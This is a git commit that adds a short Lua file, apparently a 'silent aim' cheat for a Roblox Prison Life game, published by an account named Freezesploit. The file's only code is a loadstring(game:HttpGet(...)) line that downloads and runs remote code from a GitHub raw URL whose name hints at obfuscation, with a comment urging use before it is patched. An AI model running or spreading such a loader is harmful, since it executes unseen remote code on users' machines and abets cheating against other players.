2d3655e3b5e1e16afb961fa77eb0340697a0c5a1
Freezesploit <probuunny223@gmail.com>
2025-10-30 02:24:55 -0700

    Create silentaimprisonlife.lua

---
+++ silentaimprisonlife.lua
@@ -0,0 +1,3 @@
+-- This might get patched soon so use as fast as you can.
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gonnered/aHehshjzJsizkKksdbbIsisiobfuvated/refs/heads/main/POLAND"))()
